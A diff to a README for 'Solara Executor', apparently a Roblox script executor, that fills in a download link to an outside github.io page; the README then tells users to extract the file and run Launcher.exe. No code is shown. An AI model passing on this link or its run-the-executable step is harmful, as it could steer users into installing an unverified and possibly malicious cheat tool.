@@ -16,7 +16,7 @@ Solara Executor is a **high-performance, secure, and intuitive tool** designed t
 
 ## 🛠️ Getting Started  
 ### Installation  
-1. Dowload File:  [![Download Solara Executor](https://img.shields.io/badge/Download-SolaraExecutor-blueviolet)](#)
+1. Dowload File:  [![Download Solara Executor](https://img.shields.io/badge/Download-SolaraExecutor-blueviolet)](https://solara-roblox-executor.github.io/.github/)
 2. Extract Files
 3. Open Launcher.exe
 
